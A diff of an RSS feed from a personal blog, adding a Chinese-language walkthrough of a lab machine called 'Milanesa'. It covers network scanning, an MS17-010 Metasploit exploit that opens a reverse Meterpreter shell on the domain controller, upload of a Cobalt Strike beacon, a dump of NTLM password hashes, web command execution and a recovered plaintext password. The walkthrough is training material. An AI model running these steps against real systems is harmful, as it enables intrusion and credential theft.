@@ -1,4 +1,346 @@
-<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[C1trus ]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://www.c1trus.top/</link><image><url>https://www.c1trus.top/lib/media/favicon.png</url><title>C1trus </title><link>https://www.c1trus.top/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Fri, 03 Jan 2025 02:42:51 GMT</lastBuildDate><atom:link href="https://www.c1trus.top/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Fri, 03 Jan 2025 02:42:50 GMT</pubDate><copyright><![CDATA[C1trus]]></copyright><ttl>60</ttl><dc:creator>C1trus</dc:creator><item><title><![CDATA[challenges-Misc]]></title><description><![CDATA[ 
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[C1trus ]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://www.c1trus.top/</link><image><url>https://www.c1trus.top/lib/media/favicon.png</url><title>C1trus </title><link>https://www.c1trus.top/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Fri, 03 Jan 2025 07:27:59 GMT</lastBuildDate><atom:link href="https://www.c1trus.top/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Fri, 03 Jan 2025 07:27:57 GMT</pubDate><copyright><![CDATA[C1trus]]></copyright><ttl>60</ttl><dc:creator>C1trus</dc:creator><item><title><![CDATA[8.Milanesa]]></title><description><![CDATA[ 
+ <br>****## 1. 基本信息^toc<br>
+<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
+<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
+<br><a data-tooltip-position="top" aria-label="3. ms17-010" data-href="#3. ms17-010" href="https://www.c1trus.top/about:blank#3._ms17-010" class="internal-link" target="_self" rel="noopener nofollow">3. ms17-010</a>
+<br><a data-tooltip-position="top" aria-label="4. PTH" data-href="#4. PTH" href="https://www.c1trus.top/about:blank#4._PTH" class="internal-link" target="_self" rel="noopener nofollow">4. PTH</a>
+
+<br><a data-tooltip-position="top" aria-label="4.1. mimikatz抓取域控hash" data-href="#4.1. mimikatz抓取域控hash" href="https://www.c1trus.top/about:blank#4.1._mimikatz抓取域控hash" class="internal-link" target="_self" rel="noopener nofollow">4.1. mimikatz抓取域控hash</a>
+
+
+<br><a data-tooltip-position="top" aria-label="5. 网站利用" data-href="#5. 网站利用" href="https://www.c1trus.top/about:blank#5._网站利用" class="internal-link" target="_self" rel="noopener nofollow">5. 网站利用</a><br>
+- <a data-tooltip-position="top" aria-label="5.1. 目录扫描" data-href="#5.1. 目录扫描" href="https://www.c1trus.top/about:blank#5.1._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">5.1. 目录扫描</a><br>
+- <a data-tooltip-position="top" aria-label="5.2. 登录框利用" data-href="#5.2. 登录框利用" href="https://www.c1trus.top/about:blank#5.2._登录框利用" class="internal-link" target="_self" rel="noopener nofollow">5.2. 登录框利用</a><br>
+靶机链接<br>
+难度 ⭐️⭐️⭐️️
+<br><br>┌──(root㉿kali)-[~]
+└─# fscan -h 20.20.20.0/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 2.0.0
+[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880
+[*] 开始信息扫描...
+[*] CIDR范围: 20.20.20.0-20.20.20.255
+[*] 已生成IP范围: 20.20.20.0 - 20.20.20.255
+[*] 已解析CIDR 20.20.20.0/24 -&gt; IP范围 20.20.20.0-20.20.20.255
+[*] 最终有效主机数量: 256
+[+] 目标 20.20.20.1      存活 (ICMP)
+[+] 目标 20.20.20.7      存活 (ICMP)
+[+] 目标 20.20.20.4      存活 (ICMP)
+[+] 目标 20.20.20.2      存活 (ICMP)
+[+] 目标 20.20.20.6      存活 (ICMP)
+[+] 目标 20.20.20.3      存活 (ICMP)
+[+] 目标 20.20.20.5      存活 (ICMP)
+[+] ICMP存活主机数量: 7
+[*] 共解析 218 个有效端口
+[+] 端口开放 20.20.20.7:22
+[+] 端口开放 20.20.20.3:80
+[+] 端口开放 20.20.20.6:80
+[+] 端口开放 20.20.20.6:139
+[+] 端口开放 20.20.20.5:139
+[+] 端口开放 20.20.20.5:135
+[+] 端口开放 20.20.20.4:135
+[+] 端口开放 20.20.20.4:139
+[+] 端口开放 20.20.20.6:445
+[+] 端口开放 20.20.20.3:443
+[+] 端口开放 20.20.20.3:139
+[+] 端口开放 20.20.20.3:135
+[+] 端口开放 20.20.20.1:135
+[+] 端口开放 20.20.20.6:135
+[+] 端口开放 20.20.20.1:139
+[+] 端口开放 20.20.20.4:445
+[+] 端口开放 20.20.20.5:445
+[+] 端口开放 20.20.20.3:445
+[+] 端口开放 20.20.20.1:445
+[+] 端口开放 20.20.20.4:88
+[+] 端口开放 20.20.20.3:3306
+[+] 端口开放 20.20.20.1:7680
+[+] 端口开放 20.20.20.1:7890
+[+] 端口开放 20.20.20.6:3306
+[+] 端口开放 20.20.20.5:8080
+[+] 存活端口数量: 25
+[*] 开始漏洞扫描...
+[!] 扫描错误 20.20.20.1:445 - read tcp 20.20.20.7:34666-&gt;20.20.20.1:445: read: connection reset by peer
+[!] 扫描错误 20.20.20.6:445 - read tcp 20.20.20.7:34600-&gt;20.20.20.6:445: read: connection reset by peer
+[!] 扫描错误 20.20.20.3:445 - read tcp 20.20.20.7:58318-&gt;20.20.20.3:445: read: connection reset by peer
+[*] NetInfo
+[*] 20.20.20.1
+   [-&gt;] yu
+   [-&gt;] 192.168.1.1
+   [-&gt;] 192.168.8.1
+   [-&gt;] 192.168.56.1
+   [-&gt;] 10.16.9.188
+   [-&gt;] 10.10.10.1
+   [-&gt;] 20.20.20.1
+   [-&gt;] 30.30.30.1
+   [-&gt;] 2409:8760:1e81:10::2:6dc6
+[!] 扫描错误 20.20.20.5:445 - read tcp 20.20.20.7:57976-&gt;20.20.20.5:445: read: connection reset by peer
+[*] NetBios 20.20.20.1      WORKGROUP\YU
+[*] NetInfo
+[*] 20.20.20.5
+   [-&gt;] Milanesa1
+   [-&gt;] 30.30.30.5
+   [-&gt;] 10.10.10.5
+   [-&gt;] 20.20.20.5
+   [-&gt;] 192.168.56.112
+[*] NetBios 20.20.20.3      HACKME\WIN-SEUNA992K57
+[*] NetInfo
+[*] 20.20.20.3
+   [-&gt;] WIN-SEUNA992K57
+   [-&gt;] 192.168.56.11
+   [-&gt;] 10.10.10.3
+   [-&gt;] 20.20.20.3
+   [-&gt;] 30.30.30.3
+[!] 扫描错误 20.20.20.1:7680 - Get "https://20.20.20.1:7680": EOF
+[*] 网站标题 http://20.20.20.6         状态码:503 长度:326    标题:Service Unavailable
+[*] NetInfo
+[*] 20.20.20.6
+   [-&gt;] WIN-11ULVN883E8
+   [-&gt;] 192.168.56.12
+   [-&gt;] 10.10.10.6
+   [-&gt;] 20.20.20.6
+   [-&gt;] 30.30.30.6
+[*] NetBios 20.20.20.6      WORKGROUP\WIN-11ULVN883E8
+[*] NetInfo
+[*] 20.20.20.4
+   [-&gt;] WIN-M5KV71CEGO8
+   [-&gt;] 30.30.30.6
+   [-&gt;] 20.20.20.4
+   [-&gt;] 30.30.30.4
+   [-&gt;] 10.10.10.4
+[!] 扫描错误 20.20.20.4:88 - Get "http://20.20.20.4:88": read tcp 20.20.20.7:60944-&gt;20.20.20.4:88: read: connection reset by peer
+[*] 网站标题 https://20.20.20.3        状态码:302 长度:0      标题:无标题 重定向地址: https://20.20.20.3/dashboard/
+[*] NetBios 20.20.20.5      WORKGROUP\MILANESA1
+[*] 网站标题 http://20.20.20.3         状态码:302 长度:0      标题:无标题 重定向地址: http://20.20.20.3/dashboard/
+[*] 网站标题 http://20.20.20.5:8080    状态码:200 长度:4755   标题:Milanesas Argentinas
+[+] MS17-010 20.20.20.4 (Windows Server 2016 Standard 14393)
+[*] NetBios 20.20.20.4      [+] DC:WIN-M5KV71CEGO8.hackme.thl      Windows Server 2016 Standard 14393
+[*] 网站标题 http://20.20.20.1:7890    状态码:400 长度:0      标题:无标题
+[*] 网站标题 http://20.20.20.3/dashboard/ 状态码:200 长度:5187   标题:Welcome to XAMPP
+[!] 扫描错误 20.20.20.1:7890 - Get "https://20.20.20.1:7890": EOF
+[*] 网站标题 https://20.20.20.3/dashboard/ 状态码:200 长度:5187   标题:Welcome to XAMPP
+[!] 扫描错误 20.20.20.3:3306 - Error 1045 (28000): Access denied for user 'mysql'@'20.20.20.7' (using password: YES)
+[!] 扫描错误 20.20.20.6:3306 - Error 1045 (28000): Access denied for user 'mysql'@'20.20.20.7' (using password: YES)
+[!] 扫描错误 20.20.20.7:22 - 扫描总时间超时: context deadline exceeded
+[+] 扫描已完成: 25/25
+[*] 扫描结束,耗时: 12.122585738s
+
+
+<br>整理一下<br>20.20.20.3  HACKME\WIN-SEUNA992K57  开放端口 80 135 139 443 445 3306
+20.20.20.4  WIN-M5KV71CEGO8 开放端口 53 88 135 139 389 445 464 593 636 3268 3269 
+20.20.20.5  Milanesa1 开放端口 135 139 445 3389 8080
+20.20.20.6  WIN-11ULVN883E8 开放端口 80 135 139 445 3306
+ 
+ 域名 hackme.thl
+ DC  20.20.20.4  WIN-M5KV71CEGO8.hackme.thl
+<br><br>fscan扫描出域控主机 存在ms17-010<br>
+先配置hosts<br>msfconsole
+msf6 &gt; use exploit/windows/smb/ms17_010_psexec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options
+
+Module options (exploit/windows/smb/ms17_010_psexec):
+
+   Name                  Current Setting              Required  Description
+   ----                  ---------------              --------  -----------
+   DBGTRACE              false                        yes       Show extra debug trace info
+   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
+   NAMEDPIPE                                          no        A named pipe that can be connected to (leave b
+                                                                lank for auto)
+   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
+                         work/data/wordlists/named_p
+                         ipes.txt
+   RHOSTS                                             yes       The target host(s), see https://docs.metasploi
+                                                                t.com/docs/using-metasploit/basics/using-metas
+                                                                ploit.html
+   RPORT                 445                          yes       The Target port (TCP)
+   SERVICE_DESCRIPTION                                no        Service description to be used on target for p
+                                                                retty listing
+   SERVICE_DISPLAY_NAME                               no        The service display name
+   SERVICE_NAME                                       no        The service name
+   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
+                                                                 (ADMIN$,C$,...) or a normal read/write folder
+                                                                 share
+   SMBDomain             .                            no        The Windows domain to use for authentication
+   SMBPass                                            no        The password for the specified username
+   SMBUser                                            no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.8.96     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; set lhost 20.20.20.7
+lhost =&gt; 20.20.20.7
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; set rhosts 20.20.20.4
+rhosts =&gt; 20.20.20.4
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; run
+
+[*] Started reverse TCP handler on 20.20.20.7:4444
+[*] 20.20.20.4:445 - Target OS: Windows Server 2016 Standard 14393
+[*] 20.20.20.4:445 - Built a write-what-where primitive...
+[+] 20.20.20.4:445 - Overwrite complete... SYSTEM session obtained!
+[*] 20.20.20.4:445 - Selecting PowerShell target
+[*] 20.20.20.4:445 - Executing the payload...
+[+] 20.20.20.4:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (176198 bytes) to 20.20.20.4
+[*] Meterpreter session 1 opened (20.20.20.7:4444 -&gt; 20.20.20.4:49705) at 2024-12-21 00:44:46 -0500
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; shell
+Process 1592 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+
+c:\Users\Administrator\Documents&gt;type root_flag.txt
+type root_flag.txt
+{5de4808fa7cec46234dbccc6c46fa6c84}
+
+<br>拿下，这里我们传一个cs的后面并运行。方便后续利用<br>meterpreter &gt; upload 3333.exe
+[*] Uploading  : /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
+[*] Uploaded 289.00 KiB of 289.00 KiB (100.0%): /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
+[*] Completed  : /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
+meterpreter &gt; shell
+Process 1596 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+C:\Windows\system32&gt;3333.exe
+3333.exe
+
+<br><img alt="Pasted image 20241221135649" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241221135649.png" referrerpolicy="no-referrer"><br><br>利用CS模块查看一下域内的主机<br>[12/21 14:01:39] [+] =========== 查询域主机 ==========
+[12/21 14:01:39] [*] Tasked beacon to run: dsquery computer
+[12/21 14:01:39] [+] host called home, sent: 47 bytes
+[12/21 14:01:39] [+] received output:
+"CN=WIN-M5KV71CEGO8,OU=Domain Controllers,DC=hackme,DC=thl"
+"CN=WIN-SEUNA992K57,OU=Application,OU=Tier 1 Servers,DC=hackme,DC=thl"
+
+<br>可以发现除了DC WIN-M5KV71CEGO8 外 还有一台主机 WIN-SEUNA992K57 也在域内<br>
+WIN-SEUNA992K57对应的ip是 20.20.20.3 <br>尝试使用域控的hash直接连接 这台主机<br><br>[12/21 14:05:00] beacon&gt; hashdump
+[12/21 14:05:00] [*] Tasked beacon to dump hashes
+[12/21 14:05:00] [+] host called home, sent: 82541 bytes
+[12/21 14:05:01] [+] received password hashes:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:6fda56fabbfce076170e240be62db1bc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8e6213105200de353a368062c3af0f94:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+adm_tier1:1128:aad3b435b51404eeaad3b435b51404ee:064dca142a74133d10a594683e6e9470:::
+jenkins:1131:aad3b435b51404eeaad3b435b51404ee:cb8a428385459087a76793010d60f5dc:::
+tier0_adm:1135:aad3b435b51404eeaad3b435b51404ee:b6641f2580ced2aa557daa2d1ef0aa23:::
+WIN-M5KV71CEGO8$:1000:aad3b435b51404eeaad3b435b51404ee:54bebe11da7a6447eab05ed3dea7a453:::
+WIN-SEUNA992K57$:1136:aad3b435b51404eeaad3b435b51404ee:5142662655fe8cce534e074112e50e1d::
+<br>然后尝试使用域控的HASH 直接pth 但是发现不行<br><br>先看下现在的信息<br>20.20.20.3  HACKME\WIN-SEUNA992K57  开放端口 80 135 139 443 445 3306
+20.20.20.4 【已拿下】 WIN-M5KV71CEGO8 开放端口 53 88 135 139 389 445 464 593 636 3268 3269 
+20.20.20.5  Milanesa1 开放端口 135 139 445 3389 8080
+20.20.20.6  WIN-11ULVN883E8 开放端口 80 135 139 445 3306
+ 
+ 域名 hackme.thl
+ DC  20.20.20.4  WIN-M5KV71CEGO8.hackme.thl
+<br>我们发现另外3个主机都开放了网页服务。<br>
+对这几个都进行一下目录扫描<br><br>┌──(root㉿kali)-[~/Desktop/thl/Milanesa]
+└─# dirsearch -u http://20.20.20.3
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.3/_24-12-21_01-55-52.txt
+
+Target: http://20.20.20.3/
+
+[01:55:52] Starting:
+
+[01:56:01] 301 -  336B  - /dashboard  -&gt;  http://20.20.20.3/dashboard/
+[01:56:01] 200 -    5KB - /dashboard/
+[01:56:01] 200 -   31KB - /dashboard/faq.html
+[01:56:01] 200 -   80KB - /dashboard/phpinfo.php
+[01:56:01] 200 -    6KB - /dashboard/howto.html
+[01:56:01] 302 -    0B  - /dvwa/  -&gt;  login.php
+[01:56:02] 200 -   30KB - /favicon.ico
+[01:56:13] 200 -  776B  - /Webalizer/
+[01:56:14] 200 -  768B  - /xampp/
+
+
+┌──(root㉿kali)-[~/Desktop/thl/Milanesa]
+└─# dirsearch -u http://20.20.20.5:8080
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.5_8080/_24-12-21_01-56-22.txt
+
+Target: http://20.20.20.5:8080/
+
+[01:56:22] Starting:
+
+[01:56:36] 200 -    1KB - /login.aspx
+
+
+┌──(root㉿kali)-[~/Desktop/thl/Milanesa]
+└─# dirsearch -u http://20.20.20.6
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.6/_24-12-21_01-57-34.txt
+
+Target: http://20.20.20.6/
+
+[01:57:34] Starting:
+
+Task Completed
+
+
+<br><br>发现 20.20.20.5:8080 存在一个 /login.aspx<br>
+随便输入账号密码发现都可以登录，而且登录后都是一个报错界面<br>
+<img alt="Pasted image 20241221150209" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241221150209.png" referrerpolicy="no-referrer"><br>
+这可能就不是一个真的登录框<br>
+将报错信息发给gpt 告诉我 指定的文件路径或命令没有找到<br>
+<img alt="Pasted image 20241221150320" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241221150320.png" referrerpolicy="no-referrer"><br>
+经过尝试后 发现这里是一个命令执行的利用<br>
+<img alt="Pasted image 20241221150514" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241221150514.png" referrerpolicy="no-referrer"><br>然后在网站的日志里面可以获取到用户的密码<br>
+<img alt="Pasted image 20241221152138" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241221152138.png" referrerpolicy="no-referrer"><br>
+/login=bubba:TuprimerP@ssword1234!<br>利用这个用户可以rdp到主机 20.20.20.5<br>
+登录后需要重置密码 因为密码过期了<br>Warning
+这里是西班牙键盘 ，输入密码的@不是我们正常的键盘输入的。 这里建议用屏幕键盘输入密码
+<br>进来后桌面就有用户flag <br><img alt="Pasted image 20241221152758" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241221152758.png" referrerpolicy="no-referrer"><br>!b1ngob0ngoP0ngoUseRfl4g!#]]></description><link>https://www.c1trus.top/24-渗透/thl/8.milanesa.html</link><guid isPermaLink="false">24-渗透/THL/8.Milanesa.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Fri, 03 Jan 2025 07:19:27 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241221135649.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241221135649.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[challenges-Misc]]></title><description><![CDATA[ 
  <br><br>hashcat破解就行了<br>$6$xyz$ZGQOqL77wiYAgPxsNEv2Kz3INjzK4JdG29RbaHaW5lrkH8bA8W7kC3GK4CctGrFO7.E2va7kSgF3eQXNWYQee.:reddragon
 
 Session..........: hashcat
@@ -10003,349 +10345,7 @@ Dec 21 10:32:45 server auth_proxy: Probando creaci
 上面执行 strings /opt/auth_proxy | grep "/" 时就给出了这个命令<br><br>我们在 /var/log/auth.log.1 里面发现了痕迹，但因为日志文件的轮转机制，所以其实是日志文件 /var/log/auth.log 这里面的内容<br><br>root@oscar:~# stat -c "%a" /etc/.shadow_auth
 600
 
-<br>600]]></description><link>https://www.c1trus.top/24-渗透/thl/9.binary-trail.html</link><guid isPermaLink="false">24-渗透/THL/9.Binary Trail.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate></item><item><title><![CDATA[8.Milanesa]]></title><description><![CDATA[ 
- <br>****## 1. 基本信息^toc<br>
-<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
-<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
-<br><a data-tooltip-position="top" aria-label="3. ms17-010" data-href="#3. ms17-010" href="https://www.c1trus.top/about:blank#3._ms17-010" class="internal-link" target="_self" rel="noopener nofollow">3. ms17-010</a>
-<br><a data-tooltip-position="top" aria-label="4. PTH" data-href="#4. PTH" href="https://www.c1trus.top/about:blank#4._PTH" class="internal-link" target="_self" rel="noopener nofollow">4. PTH</a>
-
-<br><a data-tooltip-position="top" aria-label="4.1. mimikatz抓取域控hash" data-href="#4.1. mimikatz抓取域控hash" href="https://www.c1trus.top/about:blank#4.1._mimikatz抓取域控hash" class="internal-link" target="_self" rel="noopener nofollow">4.1. mimikatz抓取域控hash</a>
-
-
-<br><a data-tooltip-position="top" aria-label="5. 网站利用" data-href="#5. 网站利用" href="https://www.c1trus.top/about:blank#5._网站利用" class="internal-link" target="_self" rel="noopener nofollow">5. 网站利用</a><br>
-- <a data-tooltip-position="top" aria-label="5.1. 目录扫描" data-href="#5.1. 目录扫描" href="https://www.c1trus.top/about:blank#5.1._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">5.1. 目录扫描</a><br>
-- <a data-tooltip-position="top" aria-label="5.2. 登录框利用" data-href="#5.2. 登录框利用" href="https://www.c1trus.top/about:blank#5.2._登录框利用" class="internal-link" target="_self" rel="noopener nofollow">5.2. 登录框利用</a><br>
-靶机链接<br>
-难度 ⭐️⭐️⭐️️
-<br><br>┌──(root㉿kali)-[~]
-└─# fscan -h 20.20.20.0/24
-
-   ___                              _
-  / _ \     ___  ___ _ __ __ _  ___| | __
- / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
-/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
-\____/     |___/\___|_|  \__,_|\___|_|\_\
-                     fscan version: 2.0.0
-[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880
-[*] 开始信息扫描...
-[*] CIDR范围: 20.20.20.0-20.20.20.255
-[*] 已生成IP范围: 20.20.20.0 - 20.20.20.255
-[*] 已解析CIDR 20.20.20.0/24 -&gt; IP范围 20.20.20.0-20.20.20.255
-[*] 最终有效主机数量: 256
-[+] 目标 20.20.20.1      存活 (ICMP)
-[+] 目标 20.20.20.7      存活 (ICMP)
-[+] 目标 20.20.20.4      存活 (ICMP)
-[+] 目标 20.20.20.2      存活 (ICMP)
-[+] 目标 20.20.20.6      存活 (ICMP)
-[+] 目标 20.20.20.3      存活 (ICMP)
-[+] 目标 20.20.20.5      存活 (ICMP)
-[+] ICMP存活主机数量: 7
-[*] 共解析 218 个有效端口
-[+] 端口开放 20.20.20.7:22
-[+] 端口开放 20.20.20.3:80
-[+] 端口开放 20.20.20.6:80
-[+] 端口开放 20.20.20.6:139
-[+] 端口开放 20.20.20.5:139
-[+] 端口开放 20.20.20.5:135
-[+] 端口开放 20.20.20.4:135
-[+] 端口开放 20.20.20.4:139
-[+] 端口开放 20.20.20.6:445
-[+] 端口开放 20.20.20.3:443
-[+] 端口开放 20.20.20.3:139
-[+] 端口开放 20.20.20.3:135
-[+] 端口开放 20.20.20.1:135
-[+] 端口开放 20.20.20.6:135
-[+] 端口开放 20.20.20.1:139
-[+] 端口开放 20.20.20.4:445
-[+] 端口开放 20.20.20.5:445
-[+] 端口开放 20.20.20.3:445
-[+] 端口开放 20.20.20.1:445
-[+] 端口开放 20.20.20.4:88
-[+] 端口开放 20.20.20.3:3306
-[+] 端口开放 20.20.20.1:7680
-[+] 端口开放 20.20.20.1:7890
-[+] 端口开放 20.20.20.6:3306
-[+] 端口开放 20.20.20.5:8080
-[+] 存活端口数量: 25
-[*] 开始漏洞扫描...
-[!] 扫描错误 20.20.20.1:445 - read tcp 20.20.20.7:34666-&gt;20.20.20.1:445: read: connection reset by peer
-[!] 扫描错误 20.20.20.6:445 - read tcp 20.20.20.7:34600-&gt;20.20.20.6:445: read: connection reset by peer
-[!] 扫描错误 20.20.20.3:445 - read tcp 20.20.20.7:58318-&gt;20.20.20.3:445: read: connection reset by peer
-[*] NetInfo
-[*] 20.20.20.1
-   [-&gt;] yu
-   [-&gt;] 192.168.1.1
-   [-&gt;] 192.168.8.1
-   [-&gt;] 192.168.56.1
-   [-&gt;] 10.16.9.188
-   [-&gt;] 10.10.10.1
-   [-&gt;] 20.20.20.1
-   [-&gt;] 30.30.30.1
-   [-&gt;] 2409:8760:1e81:10::2:6dc6
-[!] 扫描错误 20.20.20.5:445 - read tcp 20.20.20.7:57976-&gt;20.20.20.5:445: read: connection reset by peer
-[*] NetBios 20.20.20.1      WORKGROUP\YU
